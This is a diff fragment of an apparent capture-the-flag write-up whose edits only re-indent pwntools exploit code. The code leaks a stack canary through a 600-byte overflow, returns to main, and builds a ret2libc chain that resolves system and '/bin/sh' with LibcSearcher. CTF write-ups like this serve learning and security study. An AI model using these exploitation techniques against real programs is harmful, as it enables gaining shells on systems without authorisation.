@@ -223,14 +223,14 @@ if (strlen(thinking_note) != 624 )
 
 ```python
 def ret2main():
-	payload = flat('a'*600,canary,'a'*8,'\x20')
-	p.sendafter('624)\n', payload)
+    payload = flat('a'*600,canary,'a'*8,'\x20')
+    p.sendafter('624)\n', payload)
 
 def send(payload):
-	p.sendlineafter('path:\n','flag')
-	p.sendlineafter('len:\n','999')
-	p.sendlineafter('note:\n',payload)
-	p.recvuntil('aaaa\n')
+    p.sendlineafter('path:\n','flag')
+    p.sendlineafter('len:\n','999')
+    p.sendlineafter('note:\n',payload)
+    p.recvuntil('aaaa\n')
 
 # leak canary
 send('a'*600)
@@ -257,12 +257,12 @@ ret2main()
 
 ```python
 def ret2libc(leak, func):
-	libc = LibcSearcher(func, leak)
+    libc = LibcSearcher(func, leak)
 
-	base = leak - libc.dump(func)
-	system = base + libc.dump('system')
-	binsh = base + libc.dump('str_bin_sh')
-	return (system, binsh)
+    base = leak - libc.dump(func)
+    system = base + libc.dump('system')
+    binsh = base + libc.dump('str_bin_sh')
+    return (system, binsh)
 
 # leak libc
 pop_rdi = 0xe03
